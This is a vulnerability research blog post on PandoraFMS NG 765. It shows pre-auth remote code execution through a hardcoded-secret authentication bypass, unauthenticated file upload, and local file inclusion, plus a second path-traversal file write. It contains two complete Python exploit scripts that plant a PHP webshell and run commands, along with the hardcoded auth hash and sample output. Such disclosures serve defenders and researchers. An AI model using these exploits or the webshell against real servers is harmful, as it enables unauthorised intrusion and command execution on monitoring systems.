PandoraFMS - Pre-Auth Remote Code Execution
---

Assessed Version: PandoraFMS NG 765


While chaining three primitives together I was able to achieve pre-auth remote code execution as `apache` user on the PandoraFMS appliance. Further on it was possible to elevate the priviliges to root and also take over any connected client (Not discussed in this blog post). In this post I will walk you through the process of identifying the vulnerabilities while ignoring some of the rabbit holes I went through.


The issues which were chained for the pre-auth exploit were:
---
* Authentication Bypass due to Hardcoded Secrets
* Arbitrary File Upload
* Path Traversal leading to Local File Inclusion

For the first issue, the file upload, a simple grep for `$_FILE` was enought to identify one endpoint which seemed to accept a file upload and store the file on disk without requiring authentication.

This file is located at:
`/var/www/html/pandora_console/enterprise/meta/general/upload_head_image.php`

```php
if (count($_FILES) > 0) {
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $upload_folder.'/'.$_FILES['upload']['name'])) {
    
        echo 'done';
    }
<snip>
```

This is like a beginners CTF challenge and should remind you, that these easy bugs still surface in enterprise software. However, we just face a problem here, the `.htaccess` file in the parent directory blocks direct access to the `.php` file we would like to upload in there. Hence we can not directly trigger an invocation of the script.

But as already mentioned, this is not the only bug we're going to use. For the other's we need to look into a different file.


The other two issues reside in the ajax api logic implemented by pandorafms in the `/var/www/html/pandora_console/ajax.php` file.

Line ~110
```php
$page = (string) get_parameter('page');     [1]
$page = safe_url_extraclean($page);     [2]
$page .= '.php';                [3]

<snip a lot>

if (file_exists($page) === true) {
    include_once $page;             [4]
```

We get the value of the user controlled parameter `page` [1] and call `safe_url_extraclean()` on it [2], and eventually append `.php` to the string. And at [4] we would fall into an include statement, this is awesome. But first, let's have a look at what `safe_url_extraclean()` does.


```php
function safe_url_extraclean($string, $default_string='')
{
    // Strip the string to 125 characters
    $string = substr($string, 0, 125);

    // Search for unwanted characters
    if (preg_match('/[^a-zA-Z0-9_\/\.\-]|(\/\/)|(\.\.)/', $string)) {
        return $default_string;
    }

    return $string;
}
```

It strips the length of the supplied string to a max of 125 chars and replaces unwanted chars. At this point we can do a couple of things. In particular I use online regex helpers like [https://regex101.com/](https://regex101.com/) and play around with it, write a small php script to test things out, I might even bruteforce some chars or we can start by just patching the `.php` file with `var_dump($interstingVar);`.
In this particular case we could do a `var_dump()` before and after the clean function just inside the `ajax.php` file.

Which is what I did as the input would be either a relative path traversal or I would try to pass an absolute path into it. If that wouldn't have worked I would spend more time on the other mentioned methods.

Unfortunatly we hit a bummer, we won't reach the `include()` statement, as we weren't authenticated.

ajax.php:113
```php

$public_hash = get_parameter('auth_hash', false);               [4]
$public_login = false;


if (false === ((bool) get_parameter('doLogin', false) === true          [1]
    && $page === 'include/rest-api/index.php')
) {
    // Check user.
    if (class_exists($auth_class) === false || $public_hash === false) {    [3]
        check_login();                              [2]
    } else {
        if ($auth_class::validatePublicHash($public_hash) === false) {
            db_pandora_audit(
                AUDIT_LOG_USER_REGISTRATION,
                'Trying to access public dashboard (Invalid public hash)'
            );
            include 'general/noaccess.php';
            exit;
        }
```

When not trying to do a login [1], the application verifies that we have a valid session [2]. 
But as you can see [3] and [4] allows us to fall into another if case where `$auth_class::validatePublicHash()` is called, interesting.

Per default the authentication class is `PandoraFMS\User` so let's have a look at their `validatePublicHash()` method.


```php
<snip>
    public static function validatePublicHash(string $hash, string $other_secret='') : bool {
        global $config;

    <snip>

        // Build a hash to check.
        $hashCheck = self::generatePublicHash($other_secret);       [1]
        if ($hashCheck === $hash) {
            // "Log" user in.
            if (session_status() !== PHP_SESSION_ACTIVE) {
                session_start();
            }

<snip>
```

Within the same class now the `generatePublicHash()` function is called with an empty string as the only parameter [1].


```php
    public static function generatePublicHash(?string $other_secret=''):string
    {
        global $config;

        $str = $config['dbpass'];
        $str .= $config['id_user'];
        $str .= $other_secret;
        return hash('sha256', $str);
    }
```

Unfortunatly for the developers, these "secrets" are hardcoded and didn't change due to minor version updates and different machines. That means, we know the hash and can just supply it and in conclusion, are able to bypass the authentication mechanism and reach our beloved `include()` statement.


But wait, we still weren't currently able to traverse to our webshell due to the `safe_url_extraclean()` function call. So for example the input "../../../../tmp/test" would return "", an empty string. No luck there as it seems, but have a look again how the `include()` is triggered, there is no path in front of our input. This allowed me to use an absolute path to our webshell and finally include it for pre-auth RCE, ha what a nice catch!

Below you can see the final exploit:

```python3
import requests, sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <hostname/ip>")
    sys.exit(1)

url = f"http://{sys.argv[1]}/pandora_console/enterprise/meta/general/upload_head_image.php"
files = {'upload': ("file", b"<?php system($_REQUEST['c']); ?>")}

r = requests.post(url, files=files)

print("[*] Uploading file...")
if r.status_code == 200:
    print("[+] Upload succeeded!")
    print("[*] Triggering the `id` command")
    url_shell = f"http://{sys.argv[1]}/pandora_console/ajax.php?auth_hash=5425a56583d038bf7b34df1aeed003c92d4d0c8620d3c29ec4f5dbb1304aa551&id_user=1&c=id"
    data = {"page" : "/var/www/html/pandora_console/enterprise/meta/images/custom_logo/file", "method": "loadWelcomeWindow"}
    r = requests.post(url_shell, data=data)
    print(f"[*] Response:\n{r.text}")
    print(f"[*] Cleaning up to not leave the webshell lying around...")
    # overwrite webshell
    files["upload"] = ("file", b"")
    r = requests.post(url, files=files)
    if r.status_code == 200:
        print("[+] Cleanup worked")
    else:
        print("[-] Error while cleaning up, the shell is probably still there...")

else:
    print("[-] Exploit failed. Error while uploading our shell...")

```

And here a successful execution:
```bash

u@bzt:~/pandoraFMS$ python3 sploit1.py 192.168.178.88
[*] Uploading file...
[+] Upload succeeded!
[*] Triggering the `id` command
[*] Response:
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

[*] Cleaning up to not leave the webshell lying around...
[+] Cleanup worked
```

Funny enough RCE can also be achieved way easier, but where would the fun be if we would've had started with that one first.

I didn't show you the whole `upload_head_image.php` file, there is another `if` case - look below:

```
} else if (isset($_GET['up'])) {            [1]
    if (isset($_GET['base64'])) {
        $content = base64_decode(file_get_contents('php://input'));
    } else {
        $content = file_get_contents('php://input');    [2]
    }

    $headers = getallheaders();
    $headers = array_change_key_case($headers, CASE_UPPER);

    if (file_put_contents($upload_folder.'/'.$headers['UP-FILENAME'], $content)) {  [3]
        echo 'done';
    }
```

We supply the HTTP GET parameter `up` [1], can then decide if we supply our input base64 encoded or not, which is what we do [2].

Then it gets all the headers and uses our supplied input from [2] for the file content written to and the filepath is created with another user supplied value the `UP-FILENAME` header. 


So we set the content we want to write to a simple webshell `<?php system($_REQUESt['c']); ?>` and select a path where we want our file to be created, I chose

`../../../../../../../../../../var/www/html/pandora_console/extensions/testfile.php`

Then a simple GET request to execute `id`:
`http://192.168.178.88/pandora_console/extensions/testfile.php?c=id`
->
```
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 
```

```python3
import requests, sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <hostname/ip>")
    sys.exit(1)

url = f"http://{sys.argv[1]}/pandora_console/enterprise/meta/general/upload_head_image.php?up=true"

raw_post_data = """<?php system($_REQUEST['c']); ?>"""

headers = {"UP-FILENAME": "../../../../../../../../../../var/www/html/pandora_console/extensions/testfile.php"}

r = requests.post(url, raw_post_data, headers=headers, verify=False)
print("[*] Uploading file...")
if r.status_code == 200:
    print("[+] Upload succeeded!")
    print("[*] Triggering the `id` command")
    url_shell = f"http://{sys.argv[1]}/pandora_console/extensions/testfile.php?c=id"
    r = requests.get(url_shell)
    print(f"[*] Response:\n{r.text}")
    print(f"[*] Cleaning up to not leave the webshell lying around...")
    raw_post_data = ""
    r = requests.post(url, raw_post_data, headers=headers)
    if r.status_code == 200:
        print("[+] Cleanup worked")
    else:
        print("[-] Error while cleaning up, the shell is probably still there...")

else:
    print("[-] Exploit failed. Error while uploading our shell...")

```

And here again a successful execution:
```bash
u@bzt:~/pandoraFMS$ python3 sploit2.py 192.168.178.88
[*] Uploading file...
[+] Upload succeeded!
[*] Triggering the `id` command
[*] Response:
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

[*] Cleaning up to not leave the webshell lying around...
[+] Cleanup worked
```


So we get a limited shell as the apache user and SELinux seems to be kind of enabled. But how do we get `root`? For today this is enough, maybe we'll  cover that in another blog post.


These were the most interesting bugs I found, a couple of other issues were reported too.

